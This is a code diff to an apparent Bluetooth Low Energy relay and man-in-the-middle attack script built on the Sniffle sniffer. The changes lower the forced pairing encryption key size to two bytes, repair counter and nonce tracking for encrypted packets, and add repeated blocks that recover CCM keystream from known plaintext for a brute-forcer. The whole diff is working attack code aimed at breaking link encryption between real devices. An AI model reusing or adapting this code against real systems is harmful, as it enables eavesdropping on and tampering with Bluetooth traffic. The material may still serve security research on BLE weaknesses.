@@ -24,8 +24,7 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
         str_mac, LlControlMessage, AdvertMessage
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
-from mitble_help import downgrade_pairing_request, downgrade_pairing_response
-from brute_forcer import make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt, ble_ccm_decrypt_verify
+from mitble_help import downgrade_pairing_request, downgrade_pairing_response, make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt
 
 """
 Relay attack principles:
@@ -98,6 +97,9 @@ enc_ctr_p_to_c = 0
 enc_ctr_c_to_p = 0
 last_sn_p_to_c = None
 last_sn_c_to_p = None
+last_pdu_p_to_c = None
+last_pdu_c_to_p = None
+
 
 # IVs for building the full IV
 ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
@@ -141,7 +143,8 @@ def main():
     args = aparse.parse_args()
     global hw, periph_ser
     hw = SniffleHW(args.serport)
-    new_key_size = 0x04
+    
+    new_key_size = 0x02
 
 
     # put the hardware in a normal state (passive scanning) and configure it with an impossibly
@@ -417,6 +420,7 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     global uart_test_pending, uart_last_seq
     global link_encryption_active, enc_ctr_p_to_c, enc_ctr_c_to_p
     global last_sn_p_to_c, last_sn_c_to_p
+    global last_pdu_p_to_c, last_pdu_c_to_p   # NEW: track last PDU bytes per direction
 
     msg = hw.recv_and_decode()
 
@@ -426,55 +430,100 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
 
-        # LL_START_ENC_REQ (opcode 0x05) on this link, packetCounters are reset.
+        # LL_START_ENC_REQ / RSP (opcode 0x05) on this link, packetCounters are reset.
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:
             link_encryption_active = True
-            enc_ctr_p_to_c = 0
-            enc_ctr_c_to_p = 0
+            enc_ctr_p_to_c = -1
+            enc_ctr_c_to_p = -1
             last_sn_p_to_c = None
             last_sn_c_to_p = None
+            last_pdu_p_to_c = None      # NEW: also clear last PDU tracking
+            last_pdu_c_to_p = None
             print("Saw LL_START_ENC_RSP on real, packetCounters starts at 0")
 
+        packet_counter = None  # define here so it's visible later
+        data_dir = 1           # default, in case msg is not DataMessage
 
         if isinstance(msg, DataMessage):
             # data_dir to indicate direction:
             #   1 = slave -> master (P -> C_r)
             #   0 = master -> slave (C_r -> P)
             data_dir = getattr(msg, "data_dir", 0)
-            #print("Data direction is: ", data_dir)
             pdu = msg.body
+
             if len(pdu) < 2:
                 print("Data PDU too short for header")
-                packet_counter = None
+                has_payload = False   # NEW: avoid use-before-assign
             else:
                 hdr0 = pdu[0]
-                # SN is bit 2 of the LL data header, necessary to detect retransmission of PDU
-                sn_bit = (hdr0 >> 2) & 0x01 
+                length = pdu[1]
+                has_payload = (length > 0)
 
-                packet_counter = None
-                if link_encryption_active:
+                # SN is bit 2 of the LL data header
+                sn_bit = (hdr0 >> 2) & 0x01
+
+                if link_encryption_active and has_payload:
                     print(f"State of uart: {uart_test_pending}")
+
                     if data_dir == 1:
-                        if last_sn_p_to_c is None or sn_bit != last_sn_p_to_c:
+                        # P -> C_r
+                        if last_sn_p_to_c is None:
+                            # First encrypted PDU in this direction
                             packet_counter = enc_ctr_p_to_c
                             enc_ctr_p_to_c += 1
                             last_sn_p_to_c = sn_bit
-                            print(f"P->C_r NEW encrypted PDU, packetCounter={packet_counter}")
+                            last_pdu_p_to_c = pdu
+                            print(f"P->C_r FIRST encrypted PDU, packetCounter={packet_counter}")
+
+                        elif sn_bit != last_sn_p_to_c:
+                            # SN toggled -> definitely a new PDU
+                            enc_ctr_p_to_c += 1
+                            packet_counter = enc_ctr_p_to_c
+                            last_sn_p_to_c = sn_bit
+                            last_pdu_p_to_c = pdu
+                            print(f"P->C_r NEW encrypted PDU (SN toggled), packetCounter={packet_counter}")
+
                         else:
-                            print("P->C_r retransmit (SN unchanged) – not incrementing counter")
+                            # SN unchanged: could be retransmit OR our state was off
+                            if pdu == last_pdu_p_to_c:
+                                print("P->C_r retransmit (SN unchanged, PDU identical) – not incrementing counter")
+                            else:
+                                # SN same but payload changed => treat as NEW and resync
+                                enc_ctr_p_to_c += 1
+                                packet_counter = enc_ctr_p_to_c
+                                last_sn_p_to_c = sn_bit  # unchanged but we confirm
+                                last_pdu_p_to_c = pdu
+                                print("P->C_r NEW encrypted PDU (SN same but payload changed) – resyncing packetCounter")
+
                     else:
-                        if last_sn_c_to_p is None or sn_bit != last_sn_c_to_p:
+                        # C_r -> P
+                        if last_sn_c_to_p is None:
                             packet_counter = enc_ctr_c_to_p
                             enc_ctr_c_to_p += 1
                             last_sn_c_to_p = sn_bit
-                            print(f"C_r->P NEW encrypted PDU, packetCounter={packet_counter}")
+                            last_pdu_c_to_p = pdu
+                            print(f"C_r->P FIRST encrypted PDU, packetCounter={packet_counter}")
+
+                        elif sn_bit != last_sn_c_to_p:
+                            packet_counter = enc_ctr_c_to_p
+                            enc_ctr_c_to_p += 1
+                            last_sn_c_to_p = sn_bit
+                            last_pdu_c_to_p = pdu
+                            print(f"C_r->P NEW encrypted PDU (SN toggled), packetCounter={packet_counter}")
+
                         else:
-                            print("C_r->P retransmit (SN unchanged) – not incrementing counter")
+                            if pdu == last_pdu_c_to_p:
+                                print("C_r->P retransmit (SN unchanged, PDU identical) – not incrementing counter")
+                            else:
+                                packet_counter = enc_ctr_c_to_p
+                                enc_ctr_c_to_p += 1
+                                last_sn_c_to_p = sn_bit
+                                last_pdu_c_to_p = pdu
+                                print("C_r->P NEW encrypted PDU (SN same but payload changed) – resyncing packetCounter")
 
-            #direction bit is opposite of data direction used by sniffle, like very logical 
-            direction_bit = 0 if data_dir == 1 else 0
-
-
+            # direction bit for CCM nonce:
+            # BLE: directionBit = 0 for P->C, 1 for C->P
+            direction_bit = 0 if data_dir == 1 else 1   # FIXED: was always 0 before
 
             if uart_test_pending and not empty and data_dir == 1:
                 print("Encrypted packet will be sent by P!")
@@ -487,10 +536,9 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                     print(f"ERROR: PDU too short for header (len={len(pdu)})")
                     return
 
-                hdr0 = pdu[0]          # LL data header first octet
-                length = pdu[1]        # length
-                payload = pdu[2:2 + length] #MIC and payload, both encrypted
-
+                hdr0 = pdu[0]
+                length = pdu[1]
+                payload = pdu[2:2 + length]
 
                 MIC_LEN = 4
                 if len(payload) <= MIC_LEN:
@@ -508,9 +556,29 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                 print(f"ciphertext: {_hx(ciphertext)}")
                 print(f"MIC (encrypted): {_hx(mic_on_air)}")
 
-
                 if iv_real_cp is not None and packet_counter is not None:
                     nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
+                    a0 = make_ble_ccm_counter_block(nonce, block_index=1)
+                    plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
+                    ciphertext_test = ciphertext[-VALUE_LEN:]
+                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
+                    print(f"       Plaintext for HULK: {_hx(a0)}")
+                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
+                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter+1, direction_bit)
+                    a0 = make_ble_ccm_counter_block(nonce, block_index=1)
+                    plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
+                    ciphertext_test = ciphertext[-VALUE_LEN:]
+                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
+                    print(f"       Plaintext for HULK: {_hx(a0)}")
+                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
+                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter+2, direction_bit)
+                    a0 = make_ble_ccm_counter_block(nonce, block_index=1)
+                    plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
+                    ciphertext_test = ciphertext[-VALUE_LEN:]
+                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
+                    print(f"       Plaintext for HULK: {_hx(a0)}")
+                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
+                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter-1, direction_bit)
                     a0 = make_ble_ccm_counter_block(nonce, block_index=1)
                     plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
                     ciphertext_test = ciphertext[-VALUE_LEN:]
@@ -550,6 +618,7 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
             hw.cmd_transmit(3, b'\x11\x0F\x3B')
 
     print_message(msg, quiet)
+
 
 
 
